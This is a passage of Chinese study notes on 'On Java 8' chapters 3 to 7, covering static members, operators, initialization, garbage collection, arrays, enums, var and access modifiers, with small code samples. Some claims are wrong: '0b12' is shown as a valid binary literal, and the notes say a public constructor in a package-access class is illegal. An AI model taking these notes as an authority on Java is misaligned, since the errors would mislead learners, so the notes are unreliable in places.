id="3.7-%E7%BC%96%E5%86%99java%E7%A8%8B%E5%BA%8F" tabindex="-1">3.7 编写Java程序</h3><ul><li><p>名称可见性：在不同模块中使用想用名称如何区分</p><ul><li>C++：使用命名空间的概念</li><li>Java：将互联网域名反转，因为域名是唯一的，以此来描述库的名称</li></ul></li><li><p>使用其他组件</p><ul><li>使用import关键字告知Java编译器你想要使用哪个类</li><li>许多编程风格指出，每一个用到的类应该被单独导入</li></ul></li><li><p>static关键字解决两个问题</p><ul><li><ol><li>需要一个共享空间保存某个特定的字段，而不关心创建多少对象，甚至没有对象</li></ol></li><li><ol start="2"><li>需要使用一个类的某个方法，而该方法和具体的对象无关</li></ol></li></ul></li><li><p>static的字段或方法不依赖于任何对象，非static的字段和方法需要创建一个对象才能使用</p></li><li><p>使用“类数据”“类方法”来表示该数据或方法只服务于类，而非特定的对象</p></li><li><p>调用static变量的两种方法</p><ul><li>通过对象调用</li><li>通过类名调用（推荐使用，体现变量的static特质）</li></ul></li></ul><h3 id="3.8-%E7%AC%AC%E4%B8%80%E4%B8%AAjava%E7%A8%8B%E5%BA%8F" tabindex="-1">3.8 第一个Java程序</h3><ul><li>程序启动的入口方法main()</li></ul><pre><code class="language-java">public static void main(String[] args)&#123;&#125;</code></pre><ul><li>public关键字代表这个方法可以被外部程序所调用</li><li>main参数是一个String数组，该数组用户获取控制台的输入，Java编译器强制传递该参数</li></ul><h3 id="3.9-%E7%BC%96%E7%A8%8B%E9%A3%8E%E6%A0%BC" tabindex="-1">3.9 编程风格</h3><ul><li>驼峰命名法<ul><li>类名只有单词的首字母大写，单词间直接连接</li><li>方法，字段，变量以及对象名，首字母小写，其他和类名一样</li></ul></li></ul><h2 id="04-%E6%93%8D%E4%BD%9C%E7%AC%A6" tabindex="-1">04 操作符</h2><p>这里和C++很像，就粗略过了</p><ul><li><p>对象赋值时，真正操作的是对象的引用</p><ul><li><code>c=d</code>意味着将c和d都指向原本只有d指向的那个对象</li><li>这种现象也成为“别名”，在参数传递时也会产生别名，在进阶卷将会详解</li></ul></li><li><p>Java中不能将非布尔值当布尔值使用</p></li><li><p>逻辑操作符支持一种名为“短路”的现象</p><ul><li>一旦表达式当前部分的结算结果能够明确无误地确定整个表达式，那么余下的部分不会再执行</li><li><code>f(a) &amp; f(b) &amp; f(c)</code>,若<code>f(a)</code>为假，则<code>f(b),f(c)</code>都不用执行</li></ul></li><li><p>字面量</p><ul><li>字面量的后缀标识了类型<ul><li>大写或小写的L表示long<code>200L,200l</code></li><li>大写或小写的F表示float<code>200.0F,200.0f</code></li><li>大写或小写的D表示double<code>200D,200d</code></li></ul></li><li>前缀可以标识进制<ul><li>16进制 <code>0x12 | 0X12</code></li><li>八进制 <code>012</code></li><li>二进制 <code>0b12 | 0B12</code><ul><li>通过Integer和Long的toBinaryString()方法可以将整数转为二进制串</li></ul></li></ul></li><li>可以在数字字面量中间使用下划线，便于阅读，同时有一些规则限制（java 7新增功能）</li></ul></li><li><p>移位操作符</p><ul><li>左移，右端补0</li><li>右移<ul><li>有符号右移，进行符号扩展，正数高位插0，复数高位插1</li><li>无符号右移，使用<code>&gt;&gt;&gt;</code>，默认高位插0</li></ul></li></ul></li><li><p>Java中无法自动将int型转换为boolean型，或者说boolean类型不允许进行任何类型的转湖岸</p></li><li><p>如果对小于 int 类型的基本数据类型（即 char、byte 或者 short）执行算术运算或按位运算，运算执行前这些值就会被自动提升为 int，结果也是 int 类型，如果要把结果赋值给较小的类型，就必须使用强制类型转换（由于把值赋给了较小的类型，可能会出现信息丢失）。</p></li><li><p>Java不需要sizeof()，因为Java具有可移植性，所有数据类型在所有机器中大小都是相同的</p></li></ul><h2 id="05-%E6%8E%A7%E5%88%B6%E6%B5%81" tabindex="-1">05 控制流</h2><p>这里和C++很像，就粗略过了</p><pre><code class="language-java">if(Boolean-expression)  statementelse   statementwhile(Boolean-expression)  statementdo  statementwhile(Boolean-expression)for(initialization;Boolean-expression;step)  statement//Java5 引入更简洁的for，用于数组和容器for(Object object:objectSequence)  statement</code></pre><ul><li>编程语言一开始就有goto，可以说goto是条件控制的起源<ul><li>Java中没有goto</li><li>但有一个相似的标签，在Java中使用标签的<strong>唯一</strong>理由是用到了嵌套循环</li><li>带标签的break，continue是较少使用的实验性功能，因此此前没有其它编程语言先例</li></ul></li></ul><pre><code class="language-java">label1:outer-iteration &#123; inner-iteration &#123; // ... break; // [1] // ... continue; // [2] // ... continue label1; // [3] 跳到标签处，随后继续循环 // ... break label1; // [4] 跳到标签出，随后跳出循环 &#125;&#125;</code></pre><ul><li>switch语句实现多路选择的简洁方式<ul><li>Java7之前选择器的执行结果只能是整数，之后可以使用字符串</li><li>可以通过enum和switch结合使用</li></ul></li></ul><pre><code class="language-java">switch(integral-selector)&#123;  case intrgral-value1:statement;break;  case intrgral-value2:statement;break;  case intrgral-value3:statement;break;  // ...  default:statement&#125;</code></pre><h2 id="06-%E5%88%9D%E5%A7%8B%E5%8C%96%E5%92%8C%E6%B8%85%E7%90%86" tabindex="-1">06 初始化和清理</h2><ul><li>初始化（initialization）和清理（cleanup）正式导致“不安全”编程的两个因素</li><li>C++引入了构造器（constructor）的概念，Java同样，并且引入了一个垃圾收集器（garage collector）</li></ul><h3 id="6.1-%E7%94%A8%E6%9E%84%E9%80%A0%E5%99%A8%E4%BF%9D%E8%AF%81%E5%88%9D%E5%A7%8B%E5%8C%96" tabindex="-1">6.1 用构造器保证初始化</h3><ul><li>构造器的名字就是类的名字</li><li>构造器可以带参数也可以不带参数</li></ul><h3 id="6.2-%E6%96%B9%E6%B3%95%E9%87%8D%E8%BD%BD" tabindex="-1">6.2 方法重载</h3><ul><li><p>同一个词可以表达不同的含义，即重载</p></li><li><p>构造器只有一个名字，因此必须进行方法重载</p></li><li><p>同名的函数或构造器，每个重载方法必须有独一无二的参数类型列表</p></li></ul><h3 id="6.3-%E6%97%A0%E5%8F%82%E6%9E%84%E9%80%A0%E5%99%A8" tabindex="-1">6.3 无参构造器</h3><ul><li>无参构造器用于创建“默认对象”</li><li>如果创建了一个没有构造器的类，编译器会自动为这个类添加一个无参构造器</li></ul><h3 id="6.4-this%E5%85%B3%E9%94%AE%E5%AD%97" tabindex="-1">6.4 this关键字</h3><ul><li><p>类中的方法有一个隐藏的参数，在所有显式参数之前，代表着<strong>被操作对象的引用</strong></p></li><li><p>this关键字只能在非静态方法中使用，当需要在方法中调用对象的时候，直接使用this即可，表示了对对象的引用</p></li><li><p>在构造器中调用构造器</p><ul><li>因为this本身表示了对对象的引用，那么在this后加上参数列表，它就会显式地调用与该参数列表匹配的构造器</li><li>构造器一次只能调用一个，不能同时调用</li><li>构造器调用必须出现在方法最开始的地方，否则编译器会报错</li></ul></li><li><p>static方法的意思：没有this</p></li><li><p>静态方法有点类似于全局方法，可能看起来不符合面向对象的思想，但确实有其实用之处</p></li></ul><h3 id="6.5-%E6%B8%85%E7%90%86%EF%BC%9A%E7%BB%88%E7%BB%93%E5%92%8C%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86" tabindex="-1">6.5 清理：终结和垃圾收集</h3><h4 id="6.5.1-finialize%E6%96%B9%E6%B3%95" tabindex="-1">6.5.1 finialize方法</h4><ul><li><p>Java有垃圾收集器回收不用的对象，然而仅限于使用new关键字创建的对象</p></li><li><p>如果在不是哟个new的情况下分配了一块特殊内存，Java允许在类中定义一个finialize()方法</p><ul><li>当垃圾收集器准备释放对象资源的时候，首先调用finialize()方法，并且在下一次垃圾收集时才会回收这个对象的内存，因此finialize方法可以在垃圾收集前执行一些重要的清理工作</li></ul></li><li><p>finialize方法和C++中的析构函数不同</p><ul><li>C++中，对象一定要被销毁</li><li>Java中，finialize方法可以在垃圾清理前做一些其它工作，并不是做销毁工作</li></ul></li><li><p>finialize方法的作用</p><ul><li>垃圾收集只与内存有关，但只能回收new出来的对象</li><li>finialize存在原因：没有使用Java中的通用方法来分配内存，采用了类似C语言的机制<ul><li>主要通过<strong>本地方法</strong>来实现，在Java代码中调用非Java代码。Java里的本地方法只支持C和C++，但这些语言可以调用其他语言，所以Java实际可以调用任何代码</li><li>在非Java代码里，比如C的malloc函数，就需要调用相应的free方法来释放内存，需要在finalize方法中通过本地方法调用</li></ul></li></ul></li></ul><h4 id="6.5.2-%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E5%99%A8%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86" tabindex="-1">6.5.2 垃圾收集器的工作原理</h4><ul><li><p>垃圾收集器可以提升对象创建的速度</p><ul><li>可以把C++的堆想象成一个院子，每个对象都有自己的地盘，但地盘可能废弃，需要重新使用</li><li>但Java由于垃圾收集器的存在，堆更像是一个传送带，每次分配对象只是传送带移动，即“堆指针”向前移动，类似C++栈分配（当然记录分配情况会有额外开销，但与查找存储的开销小的多）</li><li>然而堆并不是传送带，否则如果缺页发生的频率过高，性能影响会更加显著。因此在垃圾回收的同时，垃圾收集器会压缩队中的所有对象，方便将“堆指针”移动到靠近传送带起点的位置，从而避免发生却也。即：垃圾收集器在分配存储空间的同时会将对象重新排列，由此实现一个高速的，有无限空闲空间的堆模型</li></ul></li><li><p>JVM采用了一种自适应的垃圾收集方案，至于如何处理找到的存活对象，取决于当前使用的垃圾回收算法</p><ul><li>算法1：“停止-复制”（stop-and-copy）<ul><li>程序首先停止运行，将存活的对象从一个堆复制到另一个堆，剩下的都是垃圾。复制到新堆后，可以从头开始分配，因此新堆十分紧凑，可以像传送带一样分配内存。</li><li>当一个对象从一个地方移动到另一个地方的时，所有指向该对象的引用都必须修改，从栈或静态存储区到这个对象的引用可以立即更改，但在遍历过程中可能出现新指向该对象的其它引用，这些引用需要在找到时进行修复（想象一张旧地址对应新地址的表）</li><li>然而“复制收集器”有两个问题<ul><li><ol><li>需要两个堆，比实际多了一倍空间。一些JVM解决的方法是，将堆划分成块，复制动作在块之间</li></ol></li><li><ol start="2"><li>复制过程本身。一旦程序变得稳定，便很少产生垃圾，甚至没有，此时复制收集器仍会把内存从一个地方复制到另一个地方，为了防止这种情况，一些JVM在检测到没有新垃圾产生后，会切换到不同的垃圾收集算法（<strong>这就是“自适应”）</strong>，如下面的算法</li></ol></li></ul></li></ul></li><li>算法2：“标记-清除”（mark-and-sweep）<ul><li>Sun公司JVM早期版本一直使用该算法，对于一般用途，“标记-清楚”非常慢，但垃圾少或没有时，速度就会很快</li><li>该算法从栈和静态存储开始，遍历所有引用以查找存活对象，没找到一个存活对象，会给对象设置一个标志–此时尚未开始收集。只有在标记过程完成后才会开始清楚。清除过程中，没有标记的对象被释放，但不会发生复制，因此收集器如果压缩堆里的碎片需要重新排列对象。</li></ul></li><li>比较<ul><li>“停止-复制”：不是在后台完成，程序在垃圾收集时会停止</li><li>“标记-清除”：在后台完成，</li><li>垃圾收集器在内存不足时都会停止程序，且有些垃圾收集器会主动停止程序</li></ul></li></ul></li><li><p>具体方案：此处的JVM里，内存以较大的块的形式分配</p><ul><li>严格地“停止-复制”需要将每个存活的对象从旧堆分配到新堆，有了块之后，垃圾收集器可以将对象直接复制到废弃地块中，每个块中都有一个<strong>代数</strong>来跟踪它是否活着。</li><li>通常，只压缩上次垃圾收集依赖创建地块（这里面多是临时变量，生命周期短，很快称为垃圾）。如果块在某处被引用，认为其存活，垃圾收集过程中，存活对象不会被压缩或复制，而是增加代数。这样，可以很方便地处理正常情况下地大量短期临时对象。垃圾回收期会周期性地进行全面清理，不过大对象仍然不会被复制（只是增加他们所占块地代数）</li><li>JVM会监控垃圾收集地效率，如果所有对象都很稳定，垃圾收集器效率很低地话，会切换到“标记-清除”算法。同样，JVM会跟踪标记和清除地效果，如果堆里出现很多碎片，会切换回“停止-复制”算法，这就是 **“自适应”**的用武之地</li><li>由此会得到一个啰嗦的称呼：“自适应的，分代的，停止-复制，标记-清除”垃圾收集器</li></ul></li><li><p>JVM中有很多技术可以提升速度，其中一项重要的是“即时(just-in-time，JIT)编译器”，其与加载器的操作有关</p><ul><li>JIT会键该程序部分或全部编译为本地机器码，这样不需要JVM的解释，从而<strong>运行得更快</strong></li><li>当需要加载一个类得时候，会先定位.class文件，然后将类的字节码加载到内存。JIT会根据实际执行情况进行<strong>动态优化</strong>,会监控代码的执行频率和模式，根据这些信息生成更高效的机器码，这种动态优化使得程序在运行时会逐渐变得更快，尽管在编译时可能会慢一点</li><li><strong>惰性评估和选择性编译</strong>：JIT编译器可以根据需要对代码进行即时编译。它可以延迟编译，只在代码被频繁执行时才进行编译，避免了对不常执行的代码进行编译的浪费。这种选择性编译可以减少启动时间，并且只对真正需要优化的代码进行编译。</li><li><strong>跨平台兼容性</strong>：JIT编译器能够根据不同的硬件和操作系统生成特定的本地机器码，因此可以实现跨平台的兼容性。通过JIT编译器，Java程序可以在不同的平台上运行，而不需要重新编写和调整代码。</li></ul></li></ul><h3 id="6.6-%E6%88%90%E5%91%98%E5%88%9D%E5%A7%8B%E5%8C%96" tabindex="-1">6.6 成员初始化</h3><ul><li><p>基本类型字段会有一个初始值，对象初始值为null</p></li><li><p>如果一个对象未被初始化而被使用，会得到一个<strong>异常</strong>的运行错误</p></li><li><p>可以通过方法进行初始化，方法的参数需要已经初始化了</p></li></ul><pre><code class="language-java">public class MethodInit2 &#123; int i = f(); int j = g(i); int f() &#123; return 11; &#125; int g(int n) &#123; return n * 10; &#125;&#125;</code></pre><h3 id="6.7-%E6%9E%84%E9%80%A0%E5%99%A8%E5%88%9D%E5%A7%8B%E5%8C%96" tabindex="-1">6.7 构造器初始化</h3><ul><li><p>使用构造器进行初始化，为编程带来了更大的灵活性，但者不能阻止自动初始化的执行</p></li><li><p>类中的变量定义决定了初始化的顺序，即使分散到方法定义之间，变量定义仍然会在任何方法（包括构造器）调用之前就被初始化<br><img src="/images/PL/OnJava8/6_1.jpg" alt></p></li><li><p>静态变量在初始化时首先初始化，这里举一个例子</p></li><li><p>假设有一个Dog类，同时有一个主函数类，主函数类里面有一个main函数和一些静态变量</p><ul><li><ol><li>调用main函数的时候，会加载main函数所在的类，这时会先初始化类中的静态变量，在其它变量</li></ol></li><li><ol start="2"><li>main函数中new Dog对象，尽管没有显式的使用static关键字，但构造器实际上也是静态的，当第一次创建Dog对象或访问Dog类的静态方法时，Java解释器会搜索类路径定位Dog.class包</li></ol></li><li><ol start="3"><li>当 Dog.class 被加载后（这将创建一个 Class 对象，后面会介绍），它的所有静态初始化工作都会执行。因此，静态初始化只在 Class 对象首次加载时发生一次。</li></ol></li><li><ol start="4"><li>当使用 new Dog() 创建对象时，构建过程首先会在堆上为 Dog 对象分配足够的存储空间</li></ol></li><li><ol start="5"><li>这块存储空间会被清空，然后自动将该 Dog 对象中的所有基本类型设置为其默认值（数值类型的默认值是 0，boolean 和 char 则是和 0 等价的对应值），而引用会被设置为null。</li></ol></li><li><ol start="6"><li>执行所有出现在字段定义处的初始化操作</li></ol></li><li><ol start="7"><li>执行构造器</li></ol></li></ul></li><li><p>显式的静态初始化：Java允许在一个类中将多个静态初始化语句放在一个特殊的“静态子句”中（有时称为<strong>静态块</strong>）。这段代码和其它静态初始化语句一样，只执行一次：：第一次创建该类的对象时，或第一次访问该类的静态成员时（即使从未创建过该类的对象）。</p></li></ul><pre><code class="language-java">class Cup &#123; Cup(int marker) &#123; System.out.println(&quot;Cup(&quot; + marker + &quot;)&quot;); &#125; void f(int marker) &#123; System.out.println(&quot;f(&quot; + marker + &quot;)&quot;); &#125;&#125;class Cups &#123; static Cup cup1; static Cup cup2; static &#123; cup1 = new Cup(1); cup2 = new Cup(2); &#125; Cups() &#123; System.out.println(&quot;Cups()&quot;); &#125;&#125;public class ExplicitStatic &#123; public static void main(String[] args) &#123; System.out.println(&quot;Inside main()&quot;); Cups.cup1.f(99); // [1] &#125; // static Cups cups1 = new Cups(); // [2] // static Cups cups2 = new Cups(); // [2]&#125;</code></pre><ul><li>非静态实例的初始化：Java 提供了一种称为实例初始化（instance initialization）的类似语法，用于初始化每个对象的非静态变量。</li></ul><pre><code class="language-java">class Mug &#123; Mug(int marker) &#123; System.out.println(&quot;Mug(&quot; + marker + &quot;)&quot;); &#125;&#125;public class Mugs &#123; Mug mug1; Mug mug2; &#123; // [1] mug1 = new Mug(1); mug2 = new Mug(2); System.out.println(&quot;mug1 &amp; mug2 initialized&quot;); &#125; Mugs() &#123; System.out.println(&quot;Mugs()&quot;); &#125; Mugs(int i) &#123; System.out.println(&quot;Mugs(int)&quot;); &#125; public static void main(String[] args) &#123; System.out.println(&quot;Inside main()&quot;); new Mugs(); System.out.println(&quot;new Mugs() completed&quot;); new Mugs(1); System.out.println(&quot;new Mugs(1) completed&quot;); &#125;&#125;</code></pre><ul><li>除了缺少 static 关键字外，实例初始化子句看起来与静态初始化子句完全相同。此语法对于支持匿名内部类的初始化是必需的（参见第 11 章），但也可以用来保证无论调用哪个显式的构造器，某些操作都会发生。</li></ul><h3 id="6.8-%E6%95%B0%E7%BB%84%E5%88%9D%E5%A7%8B%E5%8C%96" tabindex="-1">6.8 数组初始化</h3><ul><li><p>数组是一个对象序列或基本类型序列，其中元素类型相同，用一个标识符名字打包在一起</p></li><li><p>数组通过方括号**索引操作符(index operator)[]**来定义和使用，数组有以下两种定义</p><ul><li>类型名字前后加上空方括号<code>int[] a1;</code></li><li>也可像C++<code>int a1[]</code></li><li>然而第一种可能更合理，表示类型是一个“int数组”</li></ul></li><li><p>编译器不允许指定数组的大小。<strong>数组名只是一个引用</strong>（已经为引用分配了），但并没有为数组对象本身分配任何空间</p></li><li><p>要为数组对象分配空间，需要编写一个初始化表达式</p><ul><li>初始化可以出现在任何地方</li><li>特殊的初始化是在创建数组的地方使用一组花括号括起来的值，这是编译器负责存储的分配<code>int[] a1 = &#123; 1, 2, 3, 4, 5 &#125;;</code></li></ul></li><li><p>所有数组有一个固有成员，length，元素从0开始计数，最大下标length-1</p><ul><li>越届时C和C++会默默接受，并允许访问所有内存，这是许多臭名昭著的错误来源</li><li>而Java会通过抛出<strong>异常</strong></li></ul></li></ul><h4 id="6.8.1-%E5%8A%A8%E6%80%81%E6%95%B0%E7%BB%84%E5%88%9B%E5%BB%BA" tabindex="-1">6.8.1 动态数组创建</h4><ul><li>这里指在程序中指定数组大小进行创建</li><li>也可通过花括号包围列表来初始化对象数组</li></ul><pre><code class="language-java">Object[] a = &#123;object1 ...&#125;;//只能用在定义数组的时候Object[] b= new Object[int];Object[] c= new Object[]&#123;object1 ...&#125;;//可以用到任何地方</code></pre><h4 id="6.8.2-%E5%8F%AF%E5%8F%98%E5%8F%82%E6%95%B0%E5%BA%8F%E5%88%97" tabindex="-1">6.8.2 可变参数序列</h4><ul><li><p>Java提供了类似C语言得<strong>可变参数列表</strong>（C中简称varargs），来创建和调用有可变参数的方法，包括数量可变的参数和未知类型的参数</p></li><li><ol><li>由于所有类都继承Object，因此可以创建一个接受Object数组的方法<code>static void printArray(Object[] args) </code></li></ol></li><li><ol start="2"><li>Java5后，可以使用省略号定义一个可变参数列表<code>static void printArray(Object... args)</code>,这里编译器会自动填充，得到的仍然是数组，可变参数列表也可以是基本变量</li></ol></li><li><ol start="3"><li>可变参数字段和非可变参数可以混用，以此得到好的重载</li></ol></li></ul><h3 id="6.9-%E6%9E%9A%E4%B8%BE%E7%B1%BB%E5%9E%8B" tabindex="-1">6.9 枚举类型</h3><pre><code class="language-java">//创建一个枚举类public enum Spiciness &#123; NOT, MILD, MEDIUM, HOT, FLAMING&#125;//使用枚举类public class SimpleEnumUse &#123; public static void main(String[] args) &#123; Spiciness howHot = Spiciness.MEDIUM; System.out.println(howHot); &#125;&#125;</code></pre><ul><li>其它方法<ul><li><code>toString()</code>，更方便地显式enum实例地名字</li><li><code>ordinal()</code>,来表示特定enum常量地声明顺序</li><li><code>values()</code>,按照顺序生成一个enum常量值地数组</li></ul></li><li>enum可以和switch语句很好地连用</li></ul><h3 id="6.10-%E6%96%B0%E7%89%B9%E6%80%A7%EF%BC%9A%E7%B1%BB%E5%9E%8B%E6%8E%A8%E6%96%AD" tabindex="-1">6.10 新特性：类型推断</h3><ul><li>最早在JDK10中启用，JDK11中优化。</li><li>再一个局部定义中（即在方法内部），编译器可以自动发现类型，这就是<strong>类型推断（type inference）</strong>，我们可以通过var关键字启用它</li></ul><pre><code class="language-java">public class TypeInference &#123; void method() &#123; // 显式类型： String hello1 = &quot;Hello&quot;; // 类型推断： var hello = &quot;Hello!&quot;; // 用户定义的类型也起作用： Plumbus pb1 = new Plumbus(); var pb2 = new Plumbus(); &#125; // 静态方法里也可以启用： static void staticMethod() &#123; var hello = &quot;Hello!&quot;; var pb2 = new Plumbus(); &#125;&#125;</code></pre><ul><li>var的限制<ul><li>必须提供足够的信息来推断类型，不可使用var声明变量没有初始值或为空</li><li>函数返回值不能是var</li><li>类型推断不能用于方法的参数。<strong>Java不支持默认参数default argument,但可以通过重载来实现,</strong></li></ul><pre><code class="language-java">public class MyClass &#123;  public void myMethod(int x, int y) &#123;      // 方法的具体实现  &#125;  public void myMethod(int x) &#123;      int defaultY = 10; // 默认值      myMethod(x, defaultY); // 调用另一个重载方法，提供默认值  &#125;&#125;</code></pre><pre><code class="language-C++">#include &lt;iostream&gt;// 带有默认参数的函数声明void printMessage(const std::string&amp; message = &quot;Hello, World!&quot;);int main() &#123;    // 调用函数时不提供参数    printMessage();  // 输出：Hello, World!    // 调用函数时提供参数    printMessage(&quot;Hello, C++!&quot;);  // 输出：Hello, C++!    return 0;&#125;// 带有默认参数的函数定义void printMessage(const std::string&amp; message) &#123;    std::cout &lt;&lt; message &lt;&lt; std::endl;&#125;</code></pre></li><li>var很适合for循环，C++中的auto也是类型推断</li></ul><h3 id="6.11-%E6%80%BB%E7%BB%93" tabindex="-1">6.11 总结</h3><ul><li>C中变量初始化不当导致了很多的问题，而Java的构造器可以保证正确的初始化和处理</li><li>C++中，“析构”非常重要，因为使用new创建的对象必须显式销毁，而Java中垃圾收集器会自动为所有对象释放内存，特殊情况需要手动<ul><li>在不需要类似析构函数行为的情况下，Java的垃圾收集器极大地简化了编程工作，增阿吉了管理内存方面急需的安全性</li><li>但同时增加了运行成本，Java的速度问题是它设计某些特定编程领域的障碍</li></ul></li></ul><h2 id="07-%E5%AE%9E%E7%8E%B0%E9%9A%90%E8%97%8F" tabindex="-1">07 实现隐藏</h2><ul><li><strong>重构</strong>的主要动机之一就是重写已经能正常工作的代码，提升其可读性、可理解性和可维护性</li><li>面向对象设计的一个主要考虑是“将变化的事物与保持不变的事物分离”。</li><li>Java提供了**访问权限修饰符(access specifier)**来允许库开发者说明哪些是对客户程序员可用的，哪些是不可用的。</li><li>访问控制级别从“最多访问”到“最少访问”依次是：public、protected、包内访问（package access，没有关键字）和private。</li><li>Java中package关键字 将组件捆绑成一个内聚的库单元</li></ul><h3 id="7.1-package%EF%BC%9A%E5%BA%93%E5%8D%95%E5%85%83" tabindex="-1">7.1 package：库单元</h3><ul><li><p>一个包（package）包含了一组类，这些类通过同一个命名空间（namespace）组织在了一起。</p><ul><li>使用包的一种方式是指定全名，如<code>java.util.ArrayList list =new java.util.ArrayList();</code>,但这样会很冗长</li><li>此时可以使用import关键字，导入单个类<code>import java.util.ArrayList;</code>，此后可以不受限制的使用<code>ArrayList</code></li><li>同时也可以导入某个包中的全部内容<code>import java.util.*;</code>，这里使用了通配符</li><li>导入包提供了一种管理命名空间的机制</li></ul></li><li><p>一个Java源代码文件是一个<strong>编译单元</strong>（或称<strong>转移单元</strong>）</p><ul><li>每个编译单元需要有一个.java结尾的文件名</li><li>在编译单元内，可以有且只能有一个public类，否则编译器会报错</li><li>如果该编译单元中有其他类，则在该包之外是看不到的，因为这些类不是public的，而是主public类的支持类(support class)</li></ul></li></ul><h4 id="7.1.1-%E4%BB%A3%E7%A0%81%E7%BB%84%E7%BB%87" tabindex="-1">7.1.1 代码组织</h4><ul><li>编译一个.java文件时，文件中的每一个类都会产生一个输出文件，其名字是.java文件中对应的类的名字，但扩展名为.class</li><li>Java中一个可运行程序就是一堆.class文件，可以使用jar归档器将它们打包压缩成一个Java档案文件(JAR)。Java解释器负责查找,加载和解释这些文件</li><li>库是一组这样的类文件，每个源文件有一个public类和其它非public类，即每个源文件都有一个公共组件，使用package关键字使得组件都属于一个命名空间</li><li>package语句出现在文件中第一个非注释处,如以下代码便是该编译单元位于hiding的命名空间中，任何使用该类都必须指定名称或者导入包(Java包的命名规则是全部小写字母)</li></ul><pre><code class="language-java">package hiding.mypackage;public class MyClass &#123; // ...&#125;</code></pre><h4 id="7.1.2-%E5%88%9B%E5%BB%BA%E7%8B%AC%E4%B8%80%E6%97%A0%E4%BA%8C%E7%9A%84%E5%8C%85%E5%90%8D" tabindex="-1">7.1.2 创建独一无二的包名</h4><ul><li><p>包的整理：将所有的.class文件放在一个目录中，使用操作系统的分层文件结构</p></li><li><p>将包文件收集到单个子目录中解决了另外两个问题：</p><ul><li><ol><li>创建唯一的包名</li></ol></li><li><ol start="2"><li>找到那些可能隐藏在某个目录结构中的类</li></ol></li></ul></li><li><p>按照惯例</p><ul><li>package 名称的第一部分是类创建者的反向的因特网域名。因为因特网域名是唯一的</li><li>第二部分是将 package 名称解析为你机器上的一个目录这样当 Java 解释器需要加载一个 .class 文件时，它就可以定位到该 .class 文件所在的目录。</li></ul></li><li><p>环境变量CLASSPATH，CLASSPATH 包含了一个或多个目录，用作查找 .class 文件的根目录</p><ul><li>使用Maven或Gradle时，可以使用其响应的代码目录</li></ul></li><li><p>通过import中*导入的两个库里有相同名称的类</p><ul><li>如果不编写导致冲突的代码，则不会有问题</li><li>或者将某个类的导入转化为单类导入，使用完全指定名称的形式</li></ul></li></ul><h4 id="7.1.3-%E5%AE%9A%E5%88%B6%E5%B7%A5%E5%85%B7%E5%BA%93" tabindex="-1">7.1.3 定制工具库</h4><ul><li>通过包创建自己的util工具库</li></ul><h4 id="7.1.4-%E7%94%A8-import-%E6%9D%A5%E6%94%B9%E5%8F%98%E8%A1%8C%E4%B8%BA" tabindex="-1">7.1.4　用 import 来改变行为</h4><ul><li><p>Java 缺少的一个功能是 C 语言的<strong>条件编译（conditional compilation）</strong>，你可以通过更改一个开关设置来获得不同的行为，而无须更改任何其他代码。</p></li><li><p>没有的原因</p><ul><li>C中这一功能最常用于解决跨平台问题：根据目标平台来编译代码的不同部分</li><li>Java 旨在自动跨平台，因此不需要这样的功能</li></ul></li><li><p>但是条件编译还有其他用途。比如调试代码，在开发中启用该功能，发布的产品中禁用</p></li></ul><h3 id="7.2-java-%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E4%BF%AE%E9%A5%B0%E7%AC%A6" tabindex="-1">7.2 Java 访问权限修饰符</h3><h4 id="7.2.1-%E5%8C%85%E8%AE%BF%E9%97%AE" tabindex="-1">7.2.1 包访问</h4><ul><li>默认访问权限没有关键字，通常称为<strong>包访问权限</strong>（有时称为“友好访问权限”）。</li><li>这意味着当前包中的所有其他类都可以访问该成员。对于此包之外的所有类，该成员显示为 private。包访问权限将相关的类分组到一个包中，以便它们可以轻松地交互。</li><li>一个编译单元（即一个文件）只能属于一个包，所以一个编译单元中的所有<br>类都可以通过包访问权限来相互访问。</li><li><strong>默认包</strong>：当在统同一目录下的文件未声明包时，Java 将这样的文件看作属于该目录的“默认包”的隐含部分，因此它们为该目录中所有其他文件提供了包访问权限。</li></ul><h4 id="7.2.2-public%EF%BC%9A%E6%8E%A5%E5%8F%A3%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90" tabindex="-1">7.2.2 public：接口访问权限</h4><ul><li>public 后面的成员声明对于所有人都是可用的</li></ul><h4 id="7.2.3-private%EF%BC%9A%E4%BD%A0%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE%E5%AE%83" tabindex="-1">7.2.3 private：你无法访问它</h4><ul><li>只有当前类的成员可以访问</li><li>只要能确定是类的“辅助”方法，这个方法就可以设为 private，以确保在包的其他地方不会意外地使用它，从而让自己无法再更改或删除。</li></ul><h4 id="7.2.4-protected%EF%BC%9A%E7%BB%A7%E6%89%BF%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90" tabindex="-1">7.2.4 protected：继承访问权限</h4><ul><li>protected 关键字处理的是继承的概念，它利用一个现有类—我们叫作基类（base class）—并在不修改现有类的情况下向该类添加新成员，还可以改变该类现有成员的行为。</li><li>为了继承一个类，需要声明新类，通过关键字 extends 扩展了现有类</li></ul><pre><code class="language-java">class Foo extends Bar &#123;</code></pre><ul><li>基类的创建者想要把特定成员的访问权限赋给子类，而不是所有的类，这时候可以通过protected关键字</li><li>protected包括了包访问权</li></ul><h4 id="7.2.5-%E5%8C%85%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E4%B8%8E%E5%85%AC%E5%85%B1%E6%9E%84%E9%80%A0%E5%99%A8" tabindex="-1">7.2.5　包访问权限与公共构造器</h4><ul><li>在<strong>只有包访问权限的类中</strong>声明一个 public 构造器是不合法的，编译器会将其标记为错误。<ul><li>这是因为在 Java 中，包访问权限（也称为默认访问权限）是指只有同一个包中的其他类可以访问该类或其成员。如果在只有包访问权限的类中声明一个 public 构造器，那么这个构造器将可以被其他包中的类访问，违反了包访问权限的规则。</li><li>为了修复这个错误，应该将构造器的访问权限设置为包访问权限（默认访问权限），或者将该构造器放在另一个具有 public 访问权限的类中。这样，只有同一个包中的类才能访问这个构造器。</li></ul></li></ul><h3 id="7.3-%E6%8E%A5%E5%8F%A3%E5%92%8C%E5%AE%9E%E7%8E%B0" tabindex="-1">7.3 